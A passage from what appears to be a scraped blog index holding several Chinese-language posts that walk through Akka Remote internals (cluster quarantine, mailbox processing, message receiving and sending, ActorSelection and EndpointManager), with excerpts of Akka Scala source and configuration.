akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)[03/17/2018 21:51:37.749] [cluster-akka.actor.default-dispatcher-105] [akka.tcp://cluster@10.104.3.35:7712/system/cluster/core/daemon] Cluster Node [akka.tcp://cluster@10.104.3.35:7712] - Marking node as TERMINATED [akka.tcp://cluster@10.104.3.36:7712], due to quarantine. Node roles [dc-default] 4.1.1 什么是quarantine 字面意思是隔离，(题外话：这个单词‘隔离’含义的起源是有典故的）， 那么大致猜测是GC或者网络抖动导致集群认为此节点不健康，被驱逐。于是检索了一下资料。 akka cluster如果判定某节点会损害集群健康，就会把它隔离，可能的原因有如下三种： System message delivery failure 系统消息传递失败 Remote DeathWatch trigger 远程死亡监控触发 Cluster MemberRemoved event 集群移除节点4.1.2 解决办法根据akka的文档，可以调整akka.cluster.failure-detector.threshold来设定判定阈值，来避免因为偶然拉动而导致的误判，但也不宜过大。另外，为了避免cluster系统与业务线程竞争，可为其设置单独的线程池. 在配置中增加 123456789akka.cluster.use-dispatcher = cluster-dispatchercluster-dispatcher &#123; type = &quot;Dispatcher&quot; executor = &quot;fork-join-executor&quot; fork-join-executor &#123; parallelism-min = 2 parallelism-max = 4 &#125;&#125; akka.cluster.use-dispatcher的默认配置为空。最后，以上办法都无法保证节点永远不down，最好的方式还是做好容错。5.参考 Akka源码分析-Remote-网络链接生命周期 https://doc.akka.io/docs/akka/current/remoting.html#lifecycle-and-failure-recovery-model","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-心跳保活","slug":"network/akka/Akka-Remote-心跳保活","date":"2021-12-03T07:49:17.535Z","updated":"2021-12-03T09:07:15.127Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-心跳保活/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%BF%83%E8%B7%B3%E4%BF%9D%E6%B4%BB/","excerpt":"","text":"1.ProtocolStateActorProtocolStateActor通过状态机维持akka链路状态， 1.1 状态维持\u0000 systemEnqueue 12345678910if (Mailbox.debug) println(receiver + &quot; having enqueued &quot; + message) val currentList = systemQueueGet if (currentList.head == NoMessage) &#123; if (actor ne null) actor.dispatcher.mailboxes.deadLetterMailbox.systemEnqueue(receiver, message)&#125; else &#123; if (!systemQueuePut(currentList, message :: currentList)) &#123; message.unlink() systemEnqueue(receiver, message) &#125;&#125; processMailbox \u0000 123456789if (next ne null) &#123; if (Mailbox.debug) println(actor.self + &quot; processing message &quot; + next) actor invoke next if (Thread.interrupted()) throw new InterruptedException(&quot;Interrupted while processing actor messages&quot;) processAllSystemMessages() if ((left &gt; 1) &amp;&amp; ((dispatcher.isThroughputDeadlineTimeDefined == false) || (System.nanoTime - deadlineNs) &lt; 0)) processMailbox(left - 1, deadlineNs)&#125;","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-收消息","slug":"network/akka/Akka-Remote-收消息","date":"2021-12-03T07:49:10.532Z","updated":"2021-12-03T09:07:15.165Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-收消息/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E6%94%B6%E6%B6%88%E6%81%AF/","excerpt":"","text":"1.概述在上文中，我们分析了网络链接建立的过程，一旦建立就可以正常的收发消息了。 发送消息的细节不再分析，因为对于本地的actor来说这个过程相对简单，它只是创立链接然后给指定的netty网路服务发送消息就好了。 接收消息就比较麻烦了，因为这对于actor来说是透明的，netty收到消息后如何把消息分发给指定的actor呢？这个分发的过程值得研究研究。2.Actor触发Akka的收消息是从mailbox里面消费消息,消费成功后触发业务Actor的onReceive，详细调用链如下：调用堆栈如下：12345678910111213onReceive:19, ClientActor (com.rcloud.akka.server.cmp)applyOrElse:167, UntypedActor$$anonfun$receive$1 (akka.actor)aroundReceive:465, Actor$class (akka.actor)aroundReceive:97, UntypedActor (akka.actor)receiveMessage:516, ActorCell (akka.actor)invoke:487, ActorCell (akka.actor)processMailbox:238, Mailbox (akka.dispatch)run:220, Mailbox (akka.dispatch)exec:393, ForkJoinExecutorConfigurator$AkkaForkJoinTask (akka.dispatch)doExec:260, ForkJoinTask (scala.concurrent.forkjoin)runTask:1339, ForkJoinPool$WorkQueue (scala.concurrent.forkjoin)runWorker:1979, ForkJoinPool (scala.concurrent.forkjoin)run:107, ForkJoinWorkerThread (scala.concurrent.forkjoin) 相关值如下：那消息是如何推送到mailbox呢，详细见下文分析3.网络层触发3.1 网络管理之前分析过，在监听创立的过程中，有一个对象非常关键：TcpServerHandler。它负责链接建立、消息收发等功能。TcpServerHandler继承了ServerHandler1234private[netty] abstract class ServerHandler( protected final val transport: NettyTransport, private final val associationListenerFuture: Future[AssociationEventListener]) extends NettyServerHelpers with CommonHandlers ServerHandler继承了NettyServerHelpers123456789101112131415161718192021222324private[netty] trait NettyServerHelpers extends SimpleChannelUpstreamHandler with NettyHelpers &#123; final override def messageReceived(ctx: ChannelHandlerContext, e: MessageEvent): Unit = &#123; super.messageReceived(ctx, e) onMessage(ctx, e) &#125; final override def exceptionCaught(ctx: ChannelHandlerContext, e: ExceptionEvent): Unit = transformException(ctx, e) final override def channelConnected(ctx: ChannelHandlerContext, e: ChannelStateEvent): Unit = &#123; super.channelConnected(ctx, e) onConnect(ctx, e) &#125; final override def channelOpen(ctx: ChannelHandlerContext, e: ChannelStateEvent): Unit = &#123; super.channelOpen(ctx, e) onOpen(ctx, e) &#125; final override def channelDisconnected(ctx: ChannelHandlerContext, e: ChannelStateEvent): Unit = &#123; super.channelDisconnected(ctx, e) onDisconnect(ctx, e) &#125;&#125; 很明显NettyServerHelpers有一个messageReceived应该就是收到消息时回调的方法，那onMessage在哪里实现呢？TcpServerHandler还继承了TcpHandlers，我们来看看TcpHandlers的onMessage方法。1234override def onMessage(ctx: ChannelHandlerContext, e: MessageEvent): Unit = &#123; val bytes: Array[Byte] = e.getMessage.asInstanceOf[ChannelBuffer].array() if (bytes.length &gt; 0) notifyListener(e.getChannel, InboundPayload(ByteString(bytes))) &#125; 它最终用InboundPayload封装了收到的数据，并调用了ChannelLocalActor.notifyListener方法。1234private[remote] object ChannelLocalActor extends ChannelLocal[Option[HandleEventListener]] &#123; override def initialValue(channel: Channel): Option[HandleEventListener] = None def notifyListener(channel: Channel, msg: HandleEvent): Unit = get(channel) foreach &#123; _ notify msg &#125;&#125; ChannelLocalActor可以先把它理解成一个ThreadLocal对象，其他的技术细节读者可以自行谷歌。notifyListener只调用了get，那具体是在哪里set的呢？通过channel变量get到的Option[HandleEventListener]又是在哪里赋值的呢？12345override def registerListener( channel: Channel, listener: HandleEventListener, msg: ChannelBuffer, remoteSocketAddress: InetSocketAddress): Unit = ChannelLocalActor.set(channel, Some(listener)) 很显然是在registerListener时set的值，那registerListener在哪里调用呢？如果读过上一篇的文章，一定会知道ServerHandler.initInbound函数，这个函数调用了CommonHandlers.init12345678910111213141516final protected def init(channel: Channel, remoteSocketAddress: SocketAddress, remoteAddress: Address, msg: ChannelBuffer)( op: (AssociationHandle ⇒ Any)): Unit = &#123; import transport._ NettyTransport.addressFromSocketAddress(channel.getLocalAddress, schemeIdentifier, system.name, Some(settings.Hostname), None) match &#123; case Some(localAddress) ⇒ val handle = createHandle(channel, localAddress, remoteAddress) handle.readHandlerPromise.future.foreach &#123; listener ⇒ registerListener(channel, listener, msg, remoteSocketAddress.asInstanceOf[InetSocketAddress]) channel.setReadable(true) &#125; op(handle) case _ ⇒ NettyTransport.gracefulClose(channel) &#125; &#125; 上面的函数中调用了registerListener，那listener具体在哪里创建的呢，或者是哪个变量对应的值呢？这就需要研究createHandle对象及其返回值是什么了。经过分析还是找到了TcpHandlers这个trait，里面有createHandle的具体实现。 123override def createHandle(channel: Channel, localAddress: Address, remoteAddress: Address): AssociationHandle = new TcpAssociationHandle(localAddress, remoteAddress, transport, channel) TcpAssociationHandle源码如下 12345678910111213141516171819private[remote] class TcpAssociationHandle( val localAddress: Address, val remoteAddress: Address, val transport: NettyTransport, private val channel: Channel) extends AssociationHandle &#123; import transport.executionContext override val readHandlerPromise: Promise[HandleEventListener] = Promise() override def write(payload: ByteString): Boolean = if (channel.isWritable &amp;&amp; channel.isOpen) &#123; channel.write(ChannelBuffers.wrappedBuffer(payload.asByteBuffer)) true &#125; else false override def disassociate(): Unit = NettyTransport.gracefulClose(channel)&#125; 3.2 节点管理 由此可见，readHandlerPromise是一个Promise[HandleEventListener]，并没有具体赋值的逻辑，这就要去使用TcpAssociationHandle的相关代码找相关的赋值逻辑了。TcpAssociationHandle在哪里使用呢？还记得handleInboundAssociation建立连接的过程吗？它最终调用了createAndRegisterEndpoint 1234567891011121314151617181920private def createAndRegisterEndpoint(handle: AkkaProtocolHandle): Unit = &#123; val writing = settings.UsePassiveConnections &amp;&amp; !endpoints.hasWritableEndpointFor(handle.remoteAddress) eventPublisher.notifyListeners(AssociatedEvent(handle.localAddress, handle.remoteAddress, inbound = true)) val endpoint = createEndpoint( handle.remoteAddress, handle.localAddress, transportMapping(handle.localAddress), settings, Some(handle), writing) if (writing) endpoints.registerWritableEndpoint(handle.remoteAddress, Some(handle.handshakeInfo.uid), endpoint) else &#123; endpoints.registerReadOnlyEndpoint(handle.remoteAddress, endpoint, handle.handshakeInfo.uid) if (!endpoints.hasWritableEndpointFor(handle.remoteAddress)) endpoints.removePolicy(handle.remoteAddress) &#125;&#125; createAndRegisterEndpoint拿着一个连接实例AkkaProtocolHandle创建了一个endpoint，其中有个很关键的字段writing，它是true还是false呢？UsePassiveConnections默认为true，且经分析!endpoints.hasWritableEndpointFor(handle.remoteAddress)应该也是true，所以writing是true 12# Reuse inbound connections for outbound messagesuse-passive-connections = on ReliableDeliverySupervisor其实是对EndpointWriter的代理。在创建ReliableDeliverySupervisor的过程中AkkaProtocolHandle是作为参数传入的，也就监听到连接消息后创建的handle。而在创建EndpointWriter的过程中，这个handle又是作为第一个参数传入了EndpointWriter。我们来看看EndpointWriter是如何使用这个handle的。 12345678override def preStart(): Unit = &#123; handle match &#123; case Some(h) ⇒ reader = startReadEndpoint(h) case None ⇒ transport.associate(remoteAddress, refuseUid).map(Handle(_)) pipeTo self &#125; &#125; 在preStart时，handle应该是有值的，如果有值，就调用了startReadEndpoint(h)方法。 123456789private def startReadEndpoint(handle: AkkaProtocolHandle): Some[ActorRef] = &#123; val newReader = context.watch(context.actorOf( RARP(context.system).configureDispatcher(EndpointReader.props(localAddress, remoteAddress, transport, settings, codec, msgDispatch, inbound, handle.handshakeInfo.uid, reliableDeliverySupervisor, receiveBuffers)).withDeploy(Deploy.local), &quot;endpointReader-&quot; + AddressUrlEncoder(remoteAddress) + &quot;-&quot; + readerId.next())) handle.readHandlerPromise.success(ActorHandleEventListener(newReader)) Some(newReader) &#125; startReadEndpoint做了什么呢？它又创建了一个Actor：EndpointReader！！！好多中间的actor创建。创建之后，调用了handle.readHandlerPromise.success(ActorHandleEventListener(newReader))给handle.readHandlerPromise。还记得ActorHandleEventListener吗，它就是把收到的消息转发了对应的actor，此处就是newReader。 3.3 消息解码EndpointReader如何处理InboundPayload消息呢？首先解码收到的消息，然后给创建它的reliableDelivery发送ack消息。 123456789101112131415161718192021222324252627override def decodeMessage( raw: ByteString, provider: RemoteActorRefProvider, localAddress: Address): (Option[Ack], Option[Message]) = &#123; val ackAndEnvelope = AckAndEnvelopeContainer.parseFrom(raw.toArray) val ackOption = if (ackAndEnvelope.hasAck) &#123; import scala.collection.JavaConverters._ Some(Ack(SeqNo(ackAndEnvelope.getAck.getCumulativeAck), ackAndEnvelope.getAck.getNacksList.asScala.map(SeqNo(_)).toSet)) &#125; else None val messageOption = if (ackAndEnvelope.hasEnvelope) &#123; val msgPdu = ackAndEnvelope.getEnvelope Some(Message( recipient = provider.resolveActorRefWithLocalAddress(msgPdu.getRecipient.getPath, localAddress), recipientAddress = AddressFromURIString(msgPdu.getRecipient.getPath), serializedMessage = msgPdu.getMessage, senderOption = if (msgPdu.hasSender) OptionVal(provider.resolveActorRefWithLocalAddress(msgPdu.getSender.getPath, localAddress)) else OptionVal.None, seqOption = if (msgPdu.hasSeq) Some(SeqNo(msgPdu.getSeq)) else None)) &#125; else None (ackOption, messageOption)&#125; 上面是decodeMessage的源码，消息最终被decode成了Message对象。 1234567891011final case class Message( recipient: InternalActorRef, recipientAddress: Address, serializedMessage: SerializedMessage, senderOption: OptionVal[ActorRef], seqOption: Option[SeqNo]) extends HasSequenceNumber &#123; def reliableDeliveryEnabled = seqOption.isDefined override def seq: SeqNo = seqOption.get&#125; 默认情况下reliableDeliveryEnabled是false的，因为发送出去的msgPdu是没有getSeq的，因为默认的tcp是保证消息发送的。所以EndpointReader收到消息后调用了msgDispatch.dispatch把消息分发出去了。根据上下文msgDispatch是在EndpointWriter创建的，代码如下。 12 val msgDispatch = new DefaultMessageDispatcher(extendedSystem, provider, markLog) DefaultMessageDispatcher.dispatch不再具体分析，它就是把消息tell给了Message.recipient，而recipient是一个InternalActorRef，对的，你没有看错，这就是一个InternalActorRef，是不是很神奇，payload解码之后直接就有目标actor的InternalActorRef了？？！！那我们就得好好看看是如何对payload进行解码的了。在decodeMessage函数中，有两处代码非常关键：“recipient = provider.resolveActorRefWithLocalAddress(msgPdu.getRecipient.getPath, localAddress)”、“if (msgPdu.hasSender) OptionVal(provider.resolveActorRefWithLocalAddress(msgPdu.getSender.getPath, localAddress))”。都是调用provider.resolveActorRefWithLocalAddress函数通过actor的path转化成了对应actor的ActorRef，很显然provider就是RemoteActorRefProvider。 123456789101112131415161718192021/** * INTERNAL API * Called in deserialization of incoming remote messages where the correct local address is known. */ private[akka] def resolveActorRefWithLocalAddress(path: String, localAddress: Address): InternalActorRef = &#123; path match &#123; case ActorPathExtractor(address, elems) ⇒ if (hasAddress(address)) local.resolveActorRef(rootGuardian, elems) else try &#123; new RemoteActorRef(transport, localAddress, RootActorPath(address) / elems, Nobody, props = None, deploy = None) &#125; catch &#123; case NonFatal(e) ⇒ log.warning(&quot;Error while resolving ActorRef [&#123;&#125;] due to [&#123;&#125;]&quot;, path, e.getMessage) new EmptyLocalActorRef(this, RootActorPath(address) / elems, eventStream) &#125; case _ ⇒ log.debug(&quot;Resolve (deserialization) of unknown (invalid) path [&#123;&#125;], using deadLetters.&quot;, path) deadLetters &#125; &#125; resolveActorRefWithLocalAddress也很简单，如果目标address包含在本机范围，就调用local.resolveActorRef，否则就创建RemoteActorRef，关于RemoteActorRef的作用这里不再讲解。 1234567891011121314151617/** * INTERNAL API */private[akka] def resolveActorRef(ref: InternalActorRef, pathElements: Iterable[String]): InternalActorRef = if (pathElements.isEmpty) &#123; log.debug(&quot;Resolve (deserialization) of empty path doesn&#x27;t match an active actor, using deadLetters.&quot;) deadLetters &#125; else ref.getChild(pathElements.iterator) match &#123; case Nobody ⇒ if (log.isDebugEnabled) log.debug( &quot;Resolve (deserialization) of path [&#123;&#125;] doesn&#x27;t match an active actor. &quot; + &quot;It has probably been stopped, using deadLetters.&quot;, pathElements.mkString(&quot;/&quot;)) new EmptyLocalActorRef(system.provider, ref.path / pathElements, eventStream) case x ⇒ x &#125; LocalActorRefProvider.resolveActorRef也比较简单，就是调用ref.getChild，而ref是LocalActorRefProvider.rootGuardian，其实就是在本地范围内从root向下查找对应的ActorRef。既然在收到消息时，是通过ActorPath找到对应的ActorRef的，那么发送消息的时候一定有把ActorRef转化成ActorPath的地方，关于这点我也带领大家验证一下。在之前的文章，我们分析过，发送消息是通过EndpointWriter.writeSend发送的，那就再来回顾一下这个函数。​ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def writeSend(s: Send): Boolean = try &#123; handle match &#123; case Some(h) ⇒ if (provider.remoteSettings.LogSend &amp;&amp; log.isDebugEnabled) &#123; def msgLog = s&quot;RemoteMessage: [$&#123;s.message&#125;] to [$&#123;s.recipient&#125;]&lt;+[$&#123;s.recipient.path&#125;] from [$&#123;s.senderOption.getOrElse(extendedSystem.deadLetters)&#125;]&quot; log.debug(&quot;sending message &#123;&#125;&quot;, msgLog) &#125; val pdu = codec.constructMessage( s.recipient.localAddressToUse, s.recipient, serializeMessage(s.message), s.senderOption, seqOption = s.seqOpt, ackOption = lastAck) val pduSize = pdu.size remoteMetrics.logPayloadBytes(s.message, pduSize) if (pduSize &gt; transport.maximumPayloadBytes) &#123; val reason = new OversizedPayloadException(s&quot;Discarding oversized payload sent to $&#123;s.recipient&#125;: max allowed size $&#123;transport.maximumPayloadBytes&#125; bytes, actual size of encoded $&#123;s.message.getClass&#125; was $&#123;pdu.size&#125; bytes.&quot;) log.error(reason, &quot;Transient association error (association remains live)&quot;) true &#125; else &#123; val ok = h.write(pdu) if (ok) &#123; ackDeadline = newAckDeadline lastAck = None &#125; ok &#125; case None ⇒ throw new EndpointException(&quot;Internal error: Endpoint is in state Writing, but no association handle is present.&quot;) &#125; &#125; catch &#123; case e: NotSerializableException ⇒ log.error(e, &quot;Serializer not defined for message type [&#123;&#125;]. Transient association error (association remains live)&quot;, s.message.getClass) true case e: IllegalArgumentException ⇒ log.error(e, &quot;Serializer not defined for message type [&#123;&#125;]. Transient association error (association remains live)&quot;, s.message.getClass) true case e: MessageSerializer.SerializationException ⇒ log.error(e, &quot;&#123;&#125; Transient association error (association remains live)&quot;, e.getMessage) true case e: EndpointException ⇒ publishAndThrow(e, Logging.ErrorLevel) case NonFatal(e) ⇒ publishAndThrow(new EndpointException(&quot;Failed to write message to the transport&quot;, e), Logging.ErrorLevel) &#125; 在发送之前，调用了codec.constructMessage把消息相关的数据都编码进了pdu，具体如何进行编码的呢？​ 12345678910111213141516171819202122232425override def constructMessage( localAddress: Address, recipient: ActorRef, serializedMessage: SerializedMessage, senderOption: OptionVal[ActorRef], seqOption: Option[SeqNo] = None, ackOption: Option[Ack] = None): ByteString = &#123; val ackAndEnvelopeBuilder = AckAndEnvelopeContainer.newBuilder val envelopeBuilder = RemoteEnvelope.newBuilder envelopeBuilder.setRecipient(serializeActorRef(recipient.path.address, recipient)) senderOption match &#123; case OptionVal.Some(sender) ⇒ envelopeBuilder.setSender(serializeActorRef(localAddress, sender)) case OptionVal.None ⇒ &#125; seqOption foreach &#123; seq ⇒ envelopeBuilder.setSeq(seq.rawValue) &#125; ackOption foreach &#123; ack ⇒ ackAndEnvelopeBuilder.setAck(ackBuilder(ack)) &#125; envelopeBuilder.setMessage(serializedMessage) ackAndEnvelopeBuilder.setEnvelope(envelopeBuilder) ByteString.ByteString1C(ackAndEnvelopeBuilder.build.toByteArray) //Reuse Byte Array (naughty!) &#125; 看到serializeActorRef了吗，它把ActorRef（这里分别是recipient和sender）进行了序列化。 1234private def serializeActorRef(defaultAddress: Address, ref: ActorRef): ActorRefData = &#123; ActorRefData.newBuilder.setPath( if (ref.path.address.host.isDefined) ref.path.toSerializationFormat else ref.path.toSerializationFormatWithAddress(defaultAddress)).build() &#125; 其实serializeActorRef也比较简单，如果当前ActorRef是本地（有host字段）则直接调用path.toSerializationFormat，否则调用toSerializationFormatWithAddress(defaultAddress) 12345678910111213141516/** * Generate full String representation including the * uid for the actor cell instance as URI fragment. * This representation should be used as serialized * representation instead of `toString`. */def toSerializationFormat: String /** * Generate full String representation including the uid for the actor cell * instance as URI fragment, replacing the Address in the RootActor Path * with the given one unless this path’s address includes host and port * information. This representation should be used as serialized * representation instead of `toStringWithAddress`. */def toSerializationFormatWithAddress(address: Address): String toSerializationFormat和toSerializationFormatWithAddress的功能官网注释已经解释的很清楚，我就不啰嗦了，不过这直接验证了在发送消息时把ActorRef序列化成对应ActorPath的String的猜测。那么在收到消息时就可以通过ActorPath找到具体的ActorRef了。至此remote模式下收发消息的过程我们就分析清楚了，如果还有不清楚的小伙伴就再把之前的文章复习一下，当然还可以在下面留言讨论。​ 参考https://www.cnblogs.com/gabry/p/9390621.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-发消息","slug":"network/akka/Akka-Remote-发消息","date":"2021-12-03T07:48:55.013Z","updated":"2021-12-03T09:07:15.176Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-发消息/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%8F%91%E6%B6%88%E6%81%AF/","excerpt":"","text":"1.概述 上文我们介绍了remote模式下Actor的创建，其实与local的创建并没有太大区别，一般情况下还是使用LocalActorRef创建了Actor。那么发消息是否意味着也是相同的呢？既然actorOf还是委托给了LocalActorRef，那么在本地创建的Actor发消息还是跟以前一样的，那么如果如何给远程的Actor发消息呢？我们一般是通过actorSelection或者给远程Actor发送一个Identify消息，来接收对应的ActorRef，然后再发消息。我们来分析一下这两者的区别。 2.ActorSelection 首先来看actorSelection，不管是用ActorSystem或者ActorContext的actorSelection方法，最终都是调用了ActorRefFactory对应的方法。 1234567891011121314151617/** * Construct an [[akka.actor.ActorSelection]] from the given path, which is * parsed for wildcards (these are replaced by regular expressions * internally). No attempt is made to verify the existence of any part of * the supplied path, it is recommended to send a message and gather the * replies in order to resolve the matching set of actors. */ def actorSelection(path: String): ActorSelection = path match &#123; case RelativeActorPath(elems) ⇒ if (elems.isEmpty) ActorSelection(provider.deadLetters, &quot;&quot;) else if (elems.head.isEmpty) ActorSelection(provider.rootGuardian, elems.tail) else ActorSelection(lookupRoot, elems) case ActorPathExtractor(address, elems) ⇒ ActorSelection(provider.rootGuardianAt(address), elems) case _ ⇒ ActorSelection(provider.deadLetters, &quot;&quot;) &#125; 我们发现它支持两种类型的path：RelativeActorPath、ActorPathExtractor。​ 123456789101112131415161718/** * Extractor for so-called “relative actor paths” as in “relative URI”, not in * “relative to some actor”. Examples: * * * &quot;grand/child&quot; * * &quot;/user/hello/world&quot; */object RelativeActorPath extends PathUtils &#123; def unapply(addr: String): Option[immutable.Seq[String]] = &#123; try &#123; val uri = new URI(addr) if (uri.isAbsolute) None else Some(split(uri.getRawPath, uri.getRawFragment)) &#125; catch &#123; case _: URISyntaxException ⇒ None &#125; &#125;&#125; 2.1 RelativeActorPath RelativeActorPath提取器比较简单，就是创建了一个URI对象，然后判断其是否为Absolute，如果是就返回None，如果不是就返回对应的elemes。 对于远程Actor，我们一般会指定主机名、端口号，例如akka.tcp://actorSystemName@10.0.0.1:2552/user/actorName，根据URI的定义，这个URI的schema是akka.tcp，很显然是Absolute，那就会返回None。 12345678910111213141516/** * Given an ActorPath it returns the Address and the path elements if the path is well-formed */object ActorPathExtractor extends PathUtils &#123; def unapply(addr: String): Option[(Address, immutable.Iterable[String])] = try &#123; val uri = new URI(addr) uri.getRawPath match &#123; case null ⇒ None case path ⇒ AddressFromURIString.unapply(uri).map((_, split(path, uri.getRawFragment).drop(1))) &#125; &#125; catch &#123; case _: URISyntaxException ⇒ None &#125;&#125; 2.2 ActorPathExtractor ActorPathExtractor这个提取器的名称定义的是有问题的，既然actorSelection只支持两种类型的路径选择：本地和远程。第一个解析器定义成相对路径，那么后面一个就直接是绝对路径好了啊，为啥用ActorPathExtractor这样蹩脚的命名？难道本地模式下，就不是ActorPath提取器了？我们来看看对于akka.tcp://actorSystemName@10.0.0.1:2552/user/actorName提取出了什么。经调试，address是akka.tcp://actorSystemName@10.0.0.1:2552，elems就是后面的user、actorName了。 也就是说remote模式下，如果有host、prot等信息就会返回_ActorSelection(provider.rootGuardianAt(address), elems)_这个类。不过好像无论哪种情况都返回这个类，好尴尬啊，但传入的第一个参数是不同的：provider.rootGuardianAt(address)。也就是说actorSelection这个函数是不区分当前的模式的，只要含有host/port就会传入provider.rootGuardianAt(address)，否则就传入provider.rootGuardian。如果在local模式下，也强制用actorSelection查找远程Actor会发生什么呢？我们来看看LocalActorRefProvider。 123override def rootGuardianAt(address: Address): ActorRef = if (address == rootPath.address) rootGuardian else deadLetters local模式下，如果待查询actor的地址就是本地地址，则直接在本地返回查找；否则就返回deadLetters。其实是无法查找远程actor的。那么RemoteActorRefProvider呢？ 1234567891011def rootGuardianAt(address: Address): ActorRef = &#123; if (hasAddress(address)) rootGuardian else try &#123; new RemoteActorRef(transport, transport.localAddressForRemote(address), RootActorPath(address), Nobody, props = None, deploy = None) &#125; catch &#123; case NonFatal(e) ⇒ log.error(e, &quot;No root guardian at [&#123;&#125;]&quot;, address) new EmptyLocalActorRef(this, RootActorPath(address), eventStream) &#125; &#125; 当然了，它也会判断一下本地地址是否包含待查询地址（防止多网卡或其他特殊情况），如果包含，则意味着是本地Actor交给rootGuardian；否则就创建RemoteActorRef。 分析到这里我们知道了，其实在remote模式下，actorSelection返回了一个RemoteActorRef，还记得这个类的作用嘛？我们之前简单分析过，它其实是对远程Acotor的一个本地网络代理，也就是说所有通过actorSelection发送给远程actor的消息，都会经过他中转。我们继续分析ActorSelection的源码。 123456789101112131415161718/** * Construct an ActorSelection from the given string representing a path * relative to the given target. This operation has to create all the * matching magic, so it is preferable to cache its result if the * intention is to send messages frequently. */ def apply(anchorRef: ActorRef, elements: Iterable[String]): ActorSelection = &#123; val compiled: immutable.IndexedSeq[SelectionPathElement] = elements.collect(&#123; case x if !x.isEmpty ⇒ if ((x.indexOf(&#x27;?&#x27;) != -1) || (x.indexOf(&#x27;*&#x27;) != -1)) SelectChildPattern(x) else if (x == &quot;..&quot;) SelectParent else SelectChildName(x) &#125;)(scala.collection.breakOut) new ActorSelection with ScalaActorSelection &#123; override val anchor = anchorRef override val path = compiled &#125; &#125; 很显然这里的anchorRef是上面创建的RemoteActorRef实例，其中ActorSelection的anchor（锚定）是anchorRef。至此，一个ActorSelection创建完毕。那么如何发消息呢？这就需要分析tell或者！方法了。 123def tell(msg: Any, sender: ActorRef): Unit = ActorSelection.deliverSelection(anchor.asInstanceOf[InternalActorRef], sender, ActorSelectionMessage(msg, path, wildcardFanOut = false)) 其实乍一看，我们应该明白，这就是在deliverSelection函数内部，把消息封装成ActorSelectionMessage发送给了anchor。​ 该函数首先判断sel的elements是否为空，很显然不为空，进入rec函数。该函数比较复杂而且还是一个尾递归函数，但我们知道此处的ref就是RemoteActorRef，那么RemoteActorRef是不是一个ActorRefWithCell呢？ 123456789private[akka] class RemoteActorRef private[akka] ( remote: RemoteTransport, val localAddressToUse: Address, val path: ActorPath, val getParent: InternalActorRef, props: Option[Props], deploy: Option[Deploy]) extends InternalActorRef with RemoteRef 那么rec就会走到case _的逻辑，也就是把消息转发给了前面创建的RemoteActorRef，我们来看看这个示例是如何实现tell的。 1234override def !(message: Any)(implicit sender: ActorRef = Actor.noSender): Unit = &#123; if (message == null) throw InvalidMessageException(&quot;Message is null&quot;) try remote.send(message, OptionVal(sender), this) catch handleException(message, sender) &#125; 2.3 RemoteActorRef RemoteActorRef这个类，通过remote把消息发送出去了，那么remote是什么呢？RemoteTransport是不是很熟悉？在ActorSystem启动的时候我们分析过这个对象，它是Remoting类的实例，Remoting里面send方法是怎样的呢？ 1234override def send(message: Any, senderOption: OptionVal[ActorRef], recipient: RemoteActorRef): Unit = endpointManager match &#123; case Some(manager) ⇒ manager.tell(Send(message, senderOption, recipient), sender = senderOption getOrElse Actor.noSender) case None ⇒ throw new RemoteTransportExceptionNoStackTrace(&quot;Attempted to send remote message but Remoting is not running.&quot;, null) &#125; 3. EndpointManager 它又把消息转发给了manager，而manager就是endpointManager。endpointManager是不是也比较眼熟呢？前面文章中我们也见到过，这是一个EndpointManager实例，而EndpointManager是一个Actor。请注意这里用Send又对message进行了封装。EndpointManager是如何对Send消息进行反应的呢？ 123456789101112131415161718192021222324252627282930case s @ Send(message, senderOption, recipientRef, _) ⇒ val recipientAddress = recipientRef.path.address def createAndRegisterWritingEndpoint(): ActorRef = &#123; endpoints.registerWritableEndpoint( recipientAddress, uid = None, createEndpoint( recipientAddress, recipientRef.localAddressToUse, transportMapping(recipientRef.localAddressToUse), settings, handleOption = None, writing = true)) &#125; endpoints.writableEndpointWithPolicyFor(recipientAddress) match &#123; case Some(Pass(endpoint, _)) ⇒ endpoint ! s case Some(Gated(timeOfRelease)) ⇒ if (timeOfRelease.isOverdue()) createAndRegisterWritingEndpoint() ! s else extendedSystem.deadLetters ! s case Some(Quarantined(uid, _)) ⇒ // timeOfRelease is only used for garbage collection reasons, therefore it is ignored here. We still have // the Quarantined tombstone and we know what UID we don&#x27;t want to accept, so use it. createAndRegisterWritingEndpoint() ! s case None ⇒ createAndRegisterWritingEndpoint() ! s &#125; ​ 分析以上逻辑，简单来看，会先判断是不是存在一个endpoint，如果存在说明链接已经建立，可以直接发送，否则出于其他状态，就重新创建endpoint，然后把消息转发给该endpoint。 1234567891011def registerWritableEndpoint(address: Address, uid: Option[Int], endpoint: ActorRef): ActorRef = addressToWritable.get(address) match &#123; case Some(Pass(e, _)) ⇒ throw new IllegalArgumentException(s&quot;Attempting to overwrite existing endpoint [$e] with [$endpoint]&quot;) case _ ⇒ // note that this overwrites Quarantine marker, // but that is ok since we keep the quarantined uid in addressToRefuseUid addressToWritable += address → Pass(endpoint, uid) writableToAddress += endpoint → address endpoint &#125; registerWritableEndpoint没有太复杂的逻辑，就是查询addressToWritable这个HashMap，如果不存在则把对应的endpoint加入缓存，并返回endpoint。而endpoint是通过createEndpoint创建的。 3.1 createEndpoint123456789101112131415161718192021222324252627282930313233343536private def createEndpoint( remoteAddress: Address, localAddress: Address, transport: AkkaProtocolTransport, endpointSettings: RemoteSettings, 